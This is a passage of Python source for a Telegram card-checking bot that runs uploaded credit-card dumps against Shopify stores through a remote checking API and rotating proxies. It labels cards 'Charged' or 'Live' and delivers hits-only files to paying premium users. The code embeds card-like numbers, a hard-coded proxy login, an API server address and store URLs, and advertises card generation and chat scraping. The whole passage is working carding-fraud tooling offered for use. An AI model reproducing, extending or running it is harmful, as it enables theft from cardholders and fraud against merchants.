📍 <b>𝗣𝗥𝗢𝗚𝗥𝗘𝗦𝗦</b>
<blockquote>📊 Checked: <code>{current_attempt_count}/{results['total']}</code></blockquote>
<blockquote>🌐 Gateway: <code>{gateway}</code></blockquote>
<blockquote>⏱️ Time: <code>{time_str}</code></blockquote>

<b>💎━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━💎</b>"""

    # Premium emoji buttons ✨
    buttons = [
        [Button.inline("⏸️ Pause", b"pause"), Button.inline("▶️ Resume", b"resume")],
        [Button.inline("🛑 Stop", b"stop")]
    ]

    try:
        await bot.edit_message(
            user_id, 
            message_id, 
            premium_emoji(progress_text),  # ← Premium emojis applied here
            buttons=buttons, 
            parse_mode='html'
        )
    except:
        pass

async def send_final_results(user_id, results):
    """Send ONLY Live/Charged hits (NO Dead) - FAST"""
    elapsed = int(time.time() - results['start_time'])
    hours = elapsed // 3600
    minutes = (elapsed % 3600) // 60
    seconds = elapsed % 60

    charged_count = len(results['charged'])
    approved_count = len(results['approved'])  # ← FIXED variable name
    dead_count = results['dead']  # INT, not list
    total_hits = charged_count + approved_count

    # FAST preview (top 2 hits)
    hits_preview = ""
    if results['charged']:
        hits_preview += f"✅ **Charged ({charged_count}):**\n"
        for r in results['charged'][:2]:
            hits_preview += f"`{r['card']}`\n"
    if results['approved']:
        hits_preview += f"🔥 **Live/Approved ({approved_count}):**\n"  # ← FIXED variable
        for r in results['approved'][:2]:
            hits_preview += f"`{r['card']}`\n"

    if total_hits == 0:
        hits_preview = "❌ **No Live/Charged hits**"

    gateway = (results['charged'][0]['gateway'] if results['charged'] 
              else results['approved'][0]['gateway'] if results['approved'] else 'Unknown')

    summary = f"""<b>⚡💳 #𝒮𝒽𝑜𝓅𝒾𝒾𝒾 𝗛𝗜𝗧𝗦 𝗢𝗡𝗟𝗬 💳⚡</b>
<b>💎━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━💎</b>

📊 <b>𝗙𝗜𝗡𝗔𝗟 𝗦𝗧𝗔𝗧𝗦</b>
<blockquote>💳 Total Cards: <b>{results['total']}</b></blockquote>
<blockquote>✅ <b>Charged:</b> <code>{charged_count}</code></blockquote>
<blockquote>🔥 <b>Live/Approved:</b> <code>{approved_count}</code></blockquote>  
<blockquote>⏱️ Time: <b>{hours}h {minutes}m {seconds}s</b></blockquote>

<b>💎━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━💎</b>
<b>🎯 𝗛𝗜𝗧𝗦 𝗣𝗥𝗘𝗩𝗜𝗘𝗪</b>
<blockquote>{hits_preview}</blockquote>
<b>💎━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━💎</b>

📁 <b>📦 HITS-ONLY.txt attached below (No Dead/Decline)</b>

🤖 <b>Bot By: 𝐅𝐑𝐎𝐗𝐓 𝐀𝐓𝐔𝐋</b>"""

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"SHOPIII_HITS_{user_id}_{timestamp}.txt"

    # TXT FILE: CHARGE + LIVE/APPROVED ONLY (NO DEAD)
    async with aiofiles.open(filename, 'w', encoding='utf-8') as f:
        await f.write("🔥🔥 SHOPIII PREMIUM HITS ONLY 🔥🔥\n")
        await f.write("=" * 90 + "\n")
        await f.write(f"Scan Date: {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}\n")
        await f.write(f"Total Cards Checked: {results['total']}\n")
        await f.write(f"✅ CHARGED HITS: {charged_count}\n")
        await f.write(f"🔥 LIVE/APPROVED HITS: {approved_count}\n")  
        await f.write(f"❌ Dead/Decline: {dead_count} (FILTERED OUT)\n")  
        await f.write("=" * 90 + "\n\n")

        # ✅ SECTION 1: CHARGED HITS ONLY
        if charged_count > 0:
            await f.write("✅✅✅ CHARGED HITS (Premium Gold) ✅✅✅\n")
            await f.write("-" * 90 + "\n")
            for r in results['charged']:
                site_info = f"Site: {r.get('site', 'Unknown')}"
                await f.write(f"{r['card']} | Charged | ${r.get('price', 'N/A')} | {r['message'][:100]} | {site_info}\n")
            await f.write("\n" + "=" * 90 + "\n\n")

        # 🔥 SECTION 2: LIVE/APPROVED HITS ONLY  
        if approved_count > 0:
            await f.write("🔥🔥🔥 LIVE / APPROVED HITS (Premium Silver) 🔥🔥🔥\n")
            await f.write("-" * 90 + "\n")
            for r in results['approved']:
                site_info = f"Site: {r.get('site', 'Unknown')}"
                await f.write(f"{r['card']} | Live | ${r.get('price', 'N/A')} | {r['message'][:100]} | {site_info}\n")
            await f.write("\n")

        if total_hits == 0:
            await f.write("❌❌❌ NO CHARGE/LIVE HITS FOUND ❌❌❌\n")

    # Send premium message + HITS-ONLY file
    await bot.send_message(
        user_id, 
        premium_emoji(summary), 
        file=filename, 
        parse_mode='html'
    )

    # Auto cleanup
    try:
        os.remove(filename)
    except:
        pass

async def test_site(site, proxy):
    """Test site using NEW API with random test card"""
    test_cards = [
        "5154623245618097|03|2032|156",
        "4358806417166436|04|2030|211",
        "4031632099088309|08|2030|936"
    ]
    test_card = random.choice(test_cards)
    
    try:
        # Proper proxy encoding
        if proxy:
            if '@' in proxy:
                proxy_str = proxy.replace(":", "%3A").replace("@", "%40")
            else:
                try:
                    ip, port, user, pw = proxy.split(':')
                    proxy_str = f"{user}%3A{pw}%40{ip}%3A{port}"
                except:
                    proxy_str = proxy.replace(":", "%3A").replace("@", "%40")
        else:
            proxy_str = "no_proxy"

        api_url = f"http://76.13.78.203:5000/shopify?5455122802569146|12|26|543&url=https://customsbyarrillc.myshopify.com&proxy=ca-mon.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2"

        timeout = aiohttp.ClientTimeout(total=60)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(api_url) as resp:
                try:
                    raw = await resp.json(content_type=None)
                except:
                    raw = {"Response": await resp.text()}

        response_msg = str(raw.get('Response', '')).lower()
        
        # Site is alive if not clear dead error
        if any(x in response_msg for x in ['error:', '407', 'proxy error', 'cannot connect', 'dead', 'failed']):
            return {'site': site, 'status': 'dead'}
        return {'site': site, 'status': 'alive'}
        
    except Exception:
        return {'site': site, 'status': 'dead'}

async def test_proxy(proxy):
    test_card = "5154623245618097|03|2032|156"
    test_site = "https://riverbendhomedev.myshopify.com"
    try:
        # Use same encoding logic
        if '@' in proxy:
            proxy_str = proxy.replace(":", "%3A").replace("@", "%40")
        else:
            try:
                ip, port, user, pw = proxy.split(':')
                proxy_str = f"{user}%3A{pw}%40{ip}%3A{port}"
            except:
                proxy_str = proxy.replace(":", "%3A").replace("@", "%40")
        
        api_url = f"http://76.13.78.203:5000/shopify?site={test_site}&cc={test_card}&proxy={proxy_str}"
        
        timeout = aiohttp.ClientTimeout(total=60)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(api_url) as resp:
                raw = await resp.json(content_type=None)
        
        response_msg = str(raw.get('Response', '')).lower()
        if '407' in response_msg or 'authentication' in response_msg or 'proxy error' in response_msg:
            return {'proxy': proxy, 'status': 'dead'}
        return {'proxy': proxy, 'status': 'alive'}
    except:
        return {'proxy': proxy, 'status': 'dead'}

@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    msg = premium_emoji(
        "<b>💳 Welcome to Shopiiiii ! 💳</b>\n"
        "<b>━━━━━━━━━━━━━━━━━</b>\n"
        "<b>⚡💠 𝐏𝐮𝐛𝐥𝐢𝐜 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬</b>\n"
        "<blockquote>• /sh card|mm|yy|cvv - Single Check\n"
        "• /chk - Reply to .txt file\n"
        "• /gen <BIN> - Generate Cards\n"
        "• /scrape me <amount> - Scrape Private Chat</blockquote>\n"
        "<b>⚡💠 𝐒𝐢𝐭𝐞 & 𝐏𝐫𝐨𝐱𝐲</b>\n"
        "<blockquote>• /proxy - Check & Clean Proxies\n"
        "• /addproxy - Add Proxies\n"
        "• /getproxy - View All Proxies</blockquote>\n"
        "<b>━━━━━━━━━━━━━━━━━</b>\n"
        "<b>👑 𝐀𝐝𝐦𝐢𝐧 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬</b>\n"
        "<blockquote>• /addpremium <id>\n"
        "• /rmpremium <id>\n"
        "• /ban <id>\n"
        "• /unban <id>\n"
        "• /addadmin <id> (Owner Only)\n"
        "• /rmadmin <id> (Owner Only)</blockquote>\n"
        "<b>━━━━━━━━━━━━━━━━━</b>\n"
        "<b>🔥 Bot By: 𝐅𝐑𝐎𝐗𝐓 𝐀𝐓𝐔𝐋</b>"
    )

    await event.reply(msg, parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/sh\s+'))
async def single_cc_check(event):
    user_id = event.sender_id

    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{user_id}"
    except:
        username = f"user_{user_id}"

    if is_banned(user_id):
        await event.reply(premium_emoji("❌ 𝐘𝐨𝐮 𝐚𝐫𝐞 𝐛𝐚𝐧𝐧𝐞𝐝."), parse_mode='html')
        return
        
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ 𝐀𝐜𝐜𝐞𝐬𝐬 𝐃𝐞𝐧𝐢𝐞𝐝\n\nOnly premium users can use this bot."), parse_mode='html')
        return

    text = event.message.text.strip()
    if len(text.split()) < 2:
        await event.reply(premium_emoji(
            """❌ 𝐔𝐬𝐚𝐠𝐞: `/sh card|mm|yy|cvv`
            
𝐄𝐱𝐚𝐦𝐩𝐥𝐞: `/sh 4031632099088309|08|2030|936`"""
        ), parse_mode='html')
        return

    sites = load_sites()
    proxies = load_proxies()

    if not sites:
        await event.reply(premium_emoji("❌ 𝐍𝐨 𝐬𝐢𝐭𝐞𝐬 𝐢𝐧 𝐬𝐢𝐭𝐞𝐬.𝐭𝐱𝐭! Add live Shopify stores."), parse_mode='html')
        return
    if not proxies:
        await event.reply(premium_emoji("❌ 𝐍𝐨 𝐩𝐫𝐨𝐱𝐢𝐞𝐬! Use `/addproxy`"), parse_mode='html')
        return

    cc_input = text.split(' ', 1)[1].strip()
    cards = extract_cc(cc_input)

    if not cards:
        await event.reply(premium_emoji("❌ 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐂𝐂 𝐟𝐨𝐫𝐦𝐚𝐭!\n\nUse: <code>card|mm|yy|cvv</code>"), parse_mode='html')
        return

    card = cards[0]
    status_msg = await event.reply(premium_emoji("⚡ 𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠 𝐋𝐢𝐯𝐞 𝐒𝐡𝐨𝐩𝐢𝐟𝐲... 🔍"), parse_mode='html')

    try:
        # Single check - ONE result always
        site = random.choice(sites)
        proxy = random.choice(proxies)
        result = await check_card(card, site, proxy)
        
        # Get BIN info
        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split('|')[0])

        # Status logic - FIXED emoji positioning
        response_lower = result['message'].lower()
        
        if result['status'] == 'Charged':
            final_status = 'Charged'
            status_emoji = '✅'
            status_text = '𝐂𝐡𝐚𝐫𝐠𝐞𝐝 💰'
            color = '💎'
        elif result['status'] == 'Approved' and 'generic_error' not in response_lower:
            final_status = 'Live'
            status_emoji = '🔥'
            status_text = '𝐋𝐢𝐯𝐞 ⚡'
            color = '⚡'
        else:
            final_status = 'Dead'
            status_emoji = '💀'
            status_text = '𝐃𝐞𝐚𝐝 💀'
            color = '💀'

        # Save to TXT file only (no Telegram spam)
        if final_status in ['Charged', 'Live']:
            await send_realtime_hit(user_id, result, final_status, username)

        # Premium single result ✨💎 - FIXED STATUS DISPLAY
        final_resp = premium_emoji(f"""<b>⚡ #𝒮𝒽𝑜𝓅𝒾𝒾𝒾 𝗦𝗜𝗡𝗚𝗟𝗘 𝗖𝗛𝗘𝗖𝗞 ⚡</b>

<b>{color} 𝐒𝐭𝐚𝐭𝐮𝐬: {status_text}</b>

<blockquote>💳 <b>Card:</b> <code>{result['card']}</code></blockquote>
<blockquote>📝 <b>Response:</b> {result['message'][:220]}</blockquote>
<blockquote>🌐 <b>Gateway:</b> {result.get('gateway', 'Shopify')} | 💰 <b>${result.get('price', '0')}</b></blockquote>

<b>🎯 𝗕𝗜𝗡 𝗜𝗻𝗙𝗢: </b><code>{brand} • {bin_type} • {level}</code>
🏦 <b>Bank:</b> <code>{bank}</code>
🌍 <b>Country:</b> <code>{country} {flag}</code>

🤖 <b>Bot By: 𝐅𝐑𝐎𝐗𝐓 𝐀𝐓𝐔𝐋</b>""")

        await status_msg.edit(final_resp, parse_mode='html')

    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ 𝐂𝐡𝐞𝐜𝐤 𝐄𝐫𝐫𝐨𝐫: {str(e)[:150]}"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/broadcast'))
async def broadcast_cmd(event):
    user_id = event.sender_id
    
    if event.sender_id != OWNER_ID:
        await event.reply(premium_emoji("❌ 𝐎𝐧𝐥𝐲 𝐨𝐰𝐧𝐞𝐫 𝐜𝐚𝐧 𝐮𝐬𝐞 𝐛𝐫𝐨𝐚𝐝𝐜𝐚𝐬𝐭!"), parse_mode='html')
        return

    args = event.message.text.split(maxsplit=1)
    if len(args) < 2:
        await event.reply(premium_emoji(
            "❌ 𝐔𝐬𝐚𝐠𝐞:\n"
            "`/broadcast <message>`\n\n"
            "𝐄𝐱𝐚𝐦𝐩𝐥𝐞:\n"
            "`/broadcast Hello everyone! New update live! 🚀`"
        ), parse_mode='html')
        return

    message = args[1]
    status_msg = await event.reply(premium_emoji("🚀 𝐒𝐭𝐚𝐫𝐭𝐢𝐧𝐠 𝐁𝐫𝐨𝐚𝐝𝐜𝐚𝐬𝐭 𝐭𝐨 𝐀𝐥𝐥 𝐔𝐬𝐞𝐫𝐬... 📢"), parse_mode='html')
    
    success_count = 0
    fail_count = 0
    skipped_count = 0
    
    async for dialog in bot.iter_dialogs():
        if dialog.is_user and not dialog.entity.bot:
            try:
                # Skip banned users
                if is_banned(dialog.entity.id):
                    skipped_count += 1
                    continue
                    
                await bot.send_message(dialog.entity, premium_emoji(f"📢 𝐁𝐫𝐨𝐚𝐝𝐜𝐚𝐬𝐭 𝐌𝐞𝐬𝐬𝐚𝐠𝐞\n\n{message}"))
                success_count += 1
                await asyncio.sleep(0.3)  # Faster rate limit
            except Exception as e:
                fail_count += 1
                print(f"Failed to send to {dialog.entity.id}: {e}")
    
    final_msg = premium_emoji(f"""✅ 𝐁𝐫𝐨𝐚𝐝𝐜𝐚𝐬𝐭 𝐂𝐨𝐦𝐩𝐥𝐞𝐭𝐞𝐝!
━━━━━━━━━━━━━━━━━
📊 𝐒𝐭𝐚𝐭𝐬:
✅ 𝐒𝐮𝐜𝐜𝐞𝐬𝐬: {success_count}
⏭️ 𝐒𝐤𝐢𝐩𝐩𝐞𝐝 (𝐁𝐚𝐧𝐧𝐞𝐝): {skipped_count}
❌ 𝐅𝐚𝐢𝐥𝐞𝐝: {fail_count}
━━━━━━━━━━━━━━━━━
🤖 𝐁𝐨𝐭 𝐁𝐲: 𝐅𝐑𝐎𝐗𝐓 𝐀𝐓𝐔𝐋""")
    
    await status_msg.edit(final_msg, parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/key'))
async def key_system(event):
    if event.sender_id != OWNER_ID:
        await event.reply(premium_emoji("❌ Owner only command!"), parse_mode='html')
        return

    args = event.message.text.split()
    if len(args) < 3:
        await event.reply(premium_emoji(
            """❌ <b>𝐔𝐬𝐚𝐠𝐞:</b> <code>/key &lt;amount&gt; &lt;days&gt;</code>

<b>Examples:</b>
<code>/key 5 30</code> → 5 keys for 30 days
<code>/key 10 7</code> → 10 keys for 7 days

<b>Range:</b> Amount (1-100) | Days (1-365)"""
        ), parse_mode='html')
        return

    try:
        amount = int(args[1])
        days = int(args[2])
        if amount < 1 or amount > 100 or days < 1 or days > 365:
            await event.reply(premium_emoji("❌ Invalid range! Amount: 1-100 | Days: 1-365"), parse_mode='html')
            return
    except:
        await event.reply(premium_emoji("❌ Invalid numbers!"), parse_mode='html')
        return

    # Generate keys ✨
    keys = []
    current_time = int(time.time())
    for i in range(amount):
        key = f"SHOPIII-{random.randint(100000,999999)}-{current_time + i}"
        keys.append({
            'key': key, 'days': days, 'expires': current_time + (days * 86400),
            'used': False, 'used_by': None
        })

    # Load & save keys 💾
    all_keys = load_keys()
    all_keys.extend(keys)
    
    try:
        save_keys(all_keys)
    except:
        backup_file = f'keys_backup_{int(time.time())}.json'
        with open(backup_file, 'w') as f:
            json.dump(keys, f, indent=2)
        await event.reply(premium_emoji(f"💾 Emergency backup: {backup_file}"), parse_mode='html')
        return

    # Premium UI 💎✨
    keys_text = ""
    for i, key_data in enumerate(keys, 1):
        expires_date = datetime.fromtimestamp(key_data['expires']).strftime('%Y-%m-%d')
        keys_text += f"{i}. <code>{key_data['key']}</code>\n"
        keys_text += f"   ✨ <b>{days} days</b> │ Expires: <b>{expires_date}</b>\n"

    total_days = amount * days
    success_msg = premium_emoji(f"""🎉 <b>{amount} Premium Keys Generated!</b> ✨

💎━━━━━━━━━━━━━━━━━━💎
{keys_text}
💎━━━━━━━━━━━━━━━━━━💎

🔥 <b>Total Value:</b> <b>{total_days} days</b>
⭐ <b>Each Valid:</b> {days} days
⚡ <b>Total Keys:</b> {len(all_keys)}
✅ <b>Saved Successfully!</b>

<i>🤖 Powered by 𝐅𝐑𝐎𝐗𝐓 𝐀𝐓𝐔𝐋</i>""")
    
    await event.reply(success_msg, parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/redeem'))
async def redeem_key(event):
    user_id = event.sender_id
    
    if is_premium(user_id):
        await event.reply(premium_emoji("✅ 𝐘𝐨𝐮 𝐚𝐥𝐫𝐞𝐚𝐝𝐲 𝐡𝐚𝐯𝐞 𝐏𝐫𝐞𝐦𝐢𝐮𝐦! 🎉"), parse_mode='html')
        return

    args = event.message.text.split(maxsplit=1)
    if len(args) < 2:
        await event.reply(premium_emoji(
            """🔑 𝐑𝐞𝐝𝐞𝐞𝐦 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐊𝐞𝐲
            
𝐔𝐬𝐚𝐠𝐞: `/redeem <key>`
𝐄𝐱𝐚𝐦𝐩𝐥𝐞: `/redeem SHOPIII-123456-1699999999`"""
        ), parse_mode='html')
        return

    key = args[1].strip().upper()
    
    # Load keys
    try:
        if not os.path.exists('keys.json'):
            await event.reply(premium_emoji("❌ 𝐍𝐨 𝐤𝐞𝐲𝐬 𝐚𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞!"), parse_mode='html')
            return
            
        with open('keys.json', 'r') as f:
            all_keys = json.load(f)
    except:
        await event.reply(premium_emoji("❌ 𝐄𝐫𝐫𝐨𝐫 𝐥𝐨𝐚𝐝𝐢𝐧𝐠 𝐤𝐞𝐲𝐬!"), parse_mode='html')
        return

    # Find key
    key_data = None
    for i, k in enumerate(all_keys):
        if k['key'] == key and not k['used']:
            key_data = k
            key_data['used'] = True
            key_data['used_by'] = user_id
            break

    if not key_data:
        await event.reply(premium_emoji("❌ 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐨𝐫 𝐚𝐥𝐫𝐞𝐚𝐝𝐲 𝐮𝐬𝐞𝐝 𝐤𝐞𝐲!"), parse_mode='html')
        return

    # Add to premium
    premium_users = load_premium_users()
    if str(user_id) not in premium_users:
        premium_users.append(str(user_id))
        save_premium_users(premium_users)

    # Update keys file
    try:
        with open('keys.json', 'w') as f:
            json.dump(all_keys, f, indent=2)
    except:
        pass

    expires_date = datetime.fromtimestamp(key_data['expires']).strftime("%d/%m/%Y")
    await event.reply(premium_emoji(
        f"""🎉 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐀𝐜𝐭𝐢𝐯𝐚𝐭𝐞𝐝! ✅
━━━━━━━━━━━━━━━━━
🔑 𝐊𝐞𝐲: `{key}`
📅 𝐄𝐱𝐩𝐢𝐫𝐞𝐬: {expires_date}
⏱️ 𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧: {key_data['days']} days
👤 𝐔𝐬𝐞𝐫: {user_id}
━━━━━━━━━━━━━━━━━
💎 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐟𝐞𝐚𝐭𝐮𝐫𝐞𝐬 𝐮𝐧𝐥𝐨𝐜𝐤𝐞𝐝!
━━━━━━━━━━━━━━━━━
🤖 𝐁𝐨𝐭 𝐁𝐲: ATUL 𝐅𝐑𝐎𝐗𝐓 𝐀𝐓𝐔𝐋"""
    ), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/keys'))
async def keys_status(event):
    if event.sender_id != OWNER_ID:
        return

    try:
        if not os.path.exists('keys.json'):
            await event.reply(premium_emoji("📭 𝐍𝐨 𝐤𝐞𝐲𝐬 𝐠𝐞𝐧𝐞𝐫𝐚𝐭𝐞𝐝 𝐲𝐞𝐭!"), parse_mode='html')
            return
            
        with open('keys.json', 'r') as f:
            all_keys = json.load(f)
        
        total = len(all_keys)
        available = len([k for k in all_keys if not k['used']])
        used = total - available
        
        status_text = f"""📊 𝐊𝐞𝐲𝐬 𝐒𝐭𝐚𝐭𝐮𝐬
━━━━━━━━━━━━━━━━━
📦 𝐓𝐨𝐭𝐚𝐥 𝐊𝐞𝐲𝐬: {total}
✅ 𝐀𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞: {available}
🔥 𝐔𝐬𝐞𝐝: {used}
━━━━━━━━━━━━━━━━━"""
        
        if available > 0:
            status_text += "\n𝐀𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞 𝐊𝐞𝐲𝐬:\n"
            for k in all_keys[:10]:
                if not k['used']:
                    status_text += f"`{k['key']}` ({k['days']}d)\n"
            if available > 10:
                status_text += f"... and {available-10} more"
        
        await event.reply(premium_emoji(status_text), parse_mode='html')
        
    except:
        await event.reply(premium_emoji("❌ 𝐄𝐫𝐫𝐨𝐫 𝐫𝐞𝐚𝐝𝐢𝐧𝐠 𝐤𝐞𝐲𝐬!"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/chk'))
async def bulk_check(event):
    user_id = event.sender_id
    
    if is_banned(user_id):
        await event.reply(premium_emoji("❌ 𝐘𝐨𝐮 𝐚𝐫𝐞 𝐛𝐚𝐧𝐧𝐞𝐝."), parse_mode='html')
        return
        
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐎𝐧𝐥𝐲"), parse_mode='html')
        return

    if not event.message.is_reply:
        await event.reply(premium_emoji("❌ Reply to a .𝐭𝐱𝐭 file"), parse_mode='html')
        return

    reply_msg = await event.get_reply_message()
    if not reply_msg.document or not str(reply_msg.file.name).endswith('.txt'):
        await event.reply(premium_emoji("❌ Reply to valid .𝐭𝐱𝐭 file"), parse_mode='html')
        return

    status = await event.reply(premium_emoji("📥 𝐃𝐨𝐰𝐧𝐥𝐨𝐚𝐝𝐢𝐧𝐠 𝐜𝐚𝐫𝐝 𝐝𝐮𝐦𝐩... ⚡"), parse_mode='html')

    try:
        file_path = await reply_msg.download_media(file="temp_cards.txt")
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            text = f.read()
        os.remove(file_path)

        cards = extract_cc(text)
        if not cards:
            await status.edit(premium_emoji("❌ 𝐍𝐨 𝐯𝐚𝐥𝐢𝐝 𝐂𝐂𝐬 𝐟𝐨𝐮𝐧𝐝 𝐢𝐧 𝐟𝐢𝐥𝐞"), parse_mode='html')
            return

        results = {
            'total': len(cards), 
            'charged': [], 
            'approved': [], 
            'dead': 0,  # Count only
            'start_time': time.time()
        }

        # Premium initial progress ✨💎
        progress_msg = await status.edit(premium_emoji(f"""🔥 #𝐒𝐡𝐨𝐩𝐢𝐢𝐢 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐒𝐜𝐚𝐧𝐧𝐞𝐫 ✨
📊 𝐒𝐓𝐀𝐓𝐒
💳 Total: <code>{results['total']}</code> 
✅ Charged: <code>0</code> 
🔥 Live: <code>0</code> 

📍 𝐏𝐑𝐎𝐆𝐑𝐄𝐒𝐒
📊 Checked: <code>0/{results['total']}</code>
🌐 Gateway: <code>Shopify</code>
⏱️ Time: <code>00m 00s</code>"""), parse_mode='html')

        sites = load_sites()
        proxies = load_proxies()

        # HITS ONLY PROCESSING
        for i, card in enumerate(cards, 1):
            result = await check_card_with_retry(card, sites, proxies)

            # Convert generic errors to dead
            response_lower = result['message'].lower()
            if result['status'] == 'Approved' and 'generic_error' in response_lower:
                result['status'] = 'Dead'

            # ✅ CHARGED HITS ONLY
            if result['status'] == 'Charged':
                results['charged'].append(result)
                await send_realtime_hit(user_id, result, 'Charged', "user")
            
            # 🔥 LIVE/APPROVED HITS ONLY  
            elif result['status'] == 'Approved':
                results['approved'].append(result)
                await send_realtime_hit(user_id, result, 'Approved', "user")
            
            # ❌ DEAD - COUNT ONLY (NO STORAGE)
            else:
                results['dead'] += 1

            # Update every 5 cards or end
            if i % 5 == 0 or i == len(cards):
                await update_progress(user_id, progress_msg.id, results, i)

        # Final HITS-ONLY results
        await send_final_results(user_id, results)
        await progress_msg.delete()

    except Exception as e:
        await status.edit(premium_emoji(f"❌ **Error:** {str(e)[:100]}"), parse_mode='html')

async def update_progress_pro(user_id, msg_id, results, checked):
    elapsed = int(time.time() - results['start_time'])
    minutes = (elapsed % 3600) // 60
    seconds = elapsed % 60
    time_str = f"{minutes:02d}m {seconds:02d}s"

    progress_text = f"""🔥 **#Shopiii** 
━━━━━━━━━━━━━━━━━
𝐏𝐑𝐎𝐆𝐑𝐄𝐒𝐒
Total: <code>{results['total']}</code> 
✅ Charged: <code>{len(results['charged'])}</code> 
🔥 Live: <code>{len(results['approved'])}</code> 
❌ Dead: <code>{results['dead']}</code>
Checked: <code>{checked}/{results['total']}</code>
Gateway: 🔥 Shopify Payments
⏱️ Time: {time_str}
━━━━━━━━━━━━━━━━━"""

    buttons = [
        [Button.inline("⏸️ Pause", b"pause"), Button.inline("▶️ Resume", b"resume")],
        [Button.inline("🛑 Stop", b"stop")]
    ]

    try:
        await bot.edit_message(user_id, msg_id, premium_emoji(progress_text), buttons=buttons, parse_mode='html')
    except:
        pass


async def send_final_results_pro(user_id, results):
    """FINAL RESULTS - HITS ONLY (No Dead Cards in File)"""
    elapsed = int(time.time() - results['start_time'])
    m = (elapsed % 3600) // 60
    s = elapsed % 60
    time_str = f"{m:02d}m {s:02d}s"

    total_hits = len(results['charged']) + len(results['approved'])

    summary = f"""✅ 𝐅𝐢𝐧𝐚𝐥 𝐒𝐭𝐚𝐭𝐮𝐬
━━━━━━━━━━━━━━━━━
𝐂𝐡𝐚𝐫𝐠𝐞 🔥 : <code>{len(results['charged'])}</code>
𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ⚡ : <code>{len(results['approved'])}</code>
𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌ : <code>{results['dead']}</code>

⏱️ 𝐓𝐢𝐦𝐞: {time_str}
📊 𝐓𝐨𝐭𝐚𝐥 𝐂𝐚𝐫𝐝𝐬: <code>{results['total']}</code>
𝐇𝐢𝐭𝐬 ??𝐨𝐮𝐧𝐝: <code>{total_hits}</code>
━━━━━━━━━━━━━━━━━
𝐎𝐧𝐥𝐲 𝐇𝐢𝐭𝐬 𝐒𝐞𝐧𝐭 𝐀𝐛𝐨𝐯𝐞"""

    # === HITS ONLY FILE ===
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"SHOPIII_HITS_{timestamp}.txt"

    async with aiofiles.open(filename, 'w', encoding='utf-8') as f:
        await f.write("🔥🔥 SHOPIII HITS ONLY - NO DEAD 🔥🔥\n")
        await f.write("=" * 70 + "\n")
        await f.write(f"Date       : {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}\n")
        await f.write(f"Total Cards: {results['total']}\n")
        await f.write(f"Charged    : {len(results['charged'])}\n")
        await f.write(f"Approved   : {len(results['approved'])}\n")
        await f.write(f"Dead       : {results['dead']} (Filtered Out)\n")
        await f.write("=" * 70 + "\n\n")

        if results['charged']:
            await f.write("✅ CHARGED HITS\n")
            await f.write("-" * 60 + "\n")
            for r in results['charged']:
                await f.write(f"{r['card']} | Charged | {r.get('price','N/A')} | {r['message'][:120]} | Site: {r.get('site','Unknown')}\n")
            await f.write("\n")

        if results['approved']:
            await f.write("🔥 APPROVED / LIVE HITS\n")
            await f.write("-" * 60 + "\n")
            for r in results['approved']:
                await f.write(f"{r['card']} | Approved | {r.get('price','N/A')} | {r['message'][:120]} | Site: {r.get('site','Unknown')}\n")

        if total_hits == 0:
            await f.write("❌ No hits found in this dump.\n")

    # Send summary + hits file
    await bot.send_message(user_id, premium_emoji(summary), file=filename, parse_mode='html')

    try:
        os.remove(filename)
    except:
        pass

@bot.on(events.NewMessage(pattern=r'^/chkproxy\s+'))
async def check_single_proxy(event):
    """Check a single proxy"""
    user_id = event.sender_id

    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ <b>Access Denied</b>\n\nOnly premium users can use this command."), parse_mode='html')
        return

    proxy = event.message.text.split(' ', 1)[1].strip()
    if not proxy:
        await event.reply(premium_emoji("❌ Usage: <code>/chkproxy ip:port:user:pass</code>"), parse_mode='html')
        return

    status_msg = await event.reply(premium_emoji(f"🔄 Checking proxy: <code>{proxy}</code>..."), parse_mode='html')

    try:
        result = await test_proxy(proxy)

        if result['status'] == 'alive':
            await status_msg.edit(premium_emoji(f"✅ <b>Proxy is ALIVE!</b>\n\n<code>{proxy}</code>"), parse_mode='html')
        else:
            await status_msg.edit(premium_emoji(f"❌ <b>Proxy is DEAD!</b>\n\n<code>{proxy}</code>"), parse_mode='html')

    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error checking proxy: {e}"), parse_mode='html')

